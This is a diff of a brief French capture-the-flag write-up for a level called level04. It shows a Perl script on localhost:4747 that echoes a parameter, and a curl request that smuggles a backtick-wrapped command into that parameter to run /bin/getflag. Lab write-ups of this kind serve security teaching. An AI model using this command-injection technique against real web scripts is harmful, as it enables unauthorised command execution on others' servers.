@@ -1,6 +1,11 @@
 On observe un script en perl "level04.pl"
 Après lecture du script il semblerait que il s'éxecute en background sur localhost:4747 et print le paramètre "x"
 
-On peut utiliser la commande curl pour query notre script en lui assignant `/bin/getflag/` au paramètre "x"
+Après quelque test, on remarque que le script fait un echo de notre parametre, en utilisant la commande curl:
+- curl localhost:4747?x="salut"
+le script répond "salut"
 
+On peut utiliser la commande curl pour query notre script en lui assignant `/bin/getflag/` au paramètre "x":
 curl localhost:4747?x="\`/bin/getflag\`"
+
+On reçoit bien notre flag !
